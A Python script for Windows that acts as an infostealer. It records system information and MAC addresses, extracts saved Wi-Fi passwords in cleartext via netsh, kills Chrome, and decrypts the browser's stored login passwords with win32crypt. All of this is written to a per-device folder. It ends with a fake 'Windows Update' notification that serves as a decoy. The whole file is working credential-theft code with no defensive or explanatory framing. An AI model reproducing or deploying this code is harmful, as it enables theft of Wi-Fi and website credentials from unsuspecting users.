from rx7 import record
time=record()
import pkg_resources.py2_warn    #pkg_resources.py2_warn
from rx7 import write
import os,subprocess,re,platform,uuid,sys #socket
from colored import attr,fg
try: os.mkdir('F')
except: pass

Device_Name= platform.node()+' - '+os.getlogin()

def ADD_DEVICE():
    if not os.path.exists('.\\F\\' + Device_Name):
        if not os.path.exists('.\\F'):
            os.mkdir('.\\F')
        os.mkdir('.\\F\\' + Device_Name)
ADD_DEVICE()

WIFIS=set(list(x[2:] for x in re.findall(r': .*', subprocess.getoutput('netsh wlan show profiles'))))

def SysINFO():
    try:
        write(f'.\\F\\{Device_Name}\\Info',mode='replace',text=f'SI:\n{platform.uname()}\nMac: {subprocess.getoutput("getmac")}\n\nWIFI:\n{WIFIS}')        
        write(f'.\\F\\{Device_Name}\\SystemINFO',subprocess.getoutput("systeminfo"))
    except:
        pass
SysINFO()

def WFPS():
    pass
    try:
        dic={}
        for wifi in WIFIS:
            a=subprocess.getoutput(f'netsh wlan show profiles {wifi} key=clear')
            try:
                new=re.search(r'Key Content.*',a)
                new=new.group()
                new= new[new.index(':')+2:]
                dic[wifi]=new 
            except:
                dic[wifi]=None
        if dic:
            write(f'.\\F\\{Device_Name}\\WF PS',str(dic))
        else:
            pass
    except:pass
WFPS()

def CP():
    subprocess.getoutput('taskkill /f /im "chrome.exe"')
    import sqlite3,win32crypt
    try:
        path = sys.argv[1]
    except IndexError:
        for w in os.walk(os.getenv('USERPROFILE')):
            if 'Chrome' in w[1]:
                path = str(w[0]) + '\\Chrome\\User Data\\Default\\Login Data'
    # <Connect to the Database>
    try:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
    except Exception as e:
        sys.exit(1)
    # <Get the results>
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except Exception as e:pass
    data = cursor.fetchall()
    password =False
    LST=[]
    x,y=[],[]
    if len(data) > 0:
        for result in data:
            # <Decrypt the Password>
            try:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            except Exception as e:
                y.append(1)
            if password:
                LST.append([result[0],result[1],password])
                x.append(1)
        if LST:
            write(f'.\\F\\{Device_Name}\\CP',text=str(LST))
        else:pass
    else:pass
CP()

from win10toast import ToastNotifier
try:
    toaster = ToastNotifier()
    toaster.show_toast("Windows Update", "New version of the windows is available.", duration=7)
except: pass                    